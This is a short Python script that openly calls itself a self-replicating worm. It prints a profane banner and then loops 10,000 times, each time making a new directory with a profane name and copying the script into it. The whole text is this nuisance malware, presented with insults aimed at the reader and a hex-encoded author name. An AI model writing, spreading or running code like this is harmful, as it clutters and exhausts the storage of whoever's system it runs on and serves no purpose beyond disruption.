# !/usr/bin/env python
# Developed By 77 62 75 61 20 7a 72 79 62 71 6c 20 7a 72 <= Find Out my name if you can , looser!
'''
    This Script is a self-replicating worm.
    ' It creates multiples folders once runned.' 
    Name: ENLFUVAV [CAESAR CIPHER 13]
'''

from sys import argv
import subprocess
import terminal_banner
banner_text = "F    U   C   K       Y   O   U       A   S   S   H   O   L   E  "
my_banner = terminal_banner.Banner(banner_text)
print(my_banner)

script = argv 
name = str(script[0])
print script
print name
for i in range(0,10000):
    directoryName = 'Fuck You Asshole' +str(i)
    subprocess.call(['mkdir', directoryName])
    subprocess.call(['cp',name,directoryName])
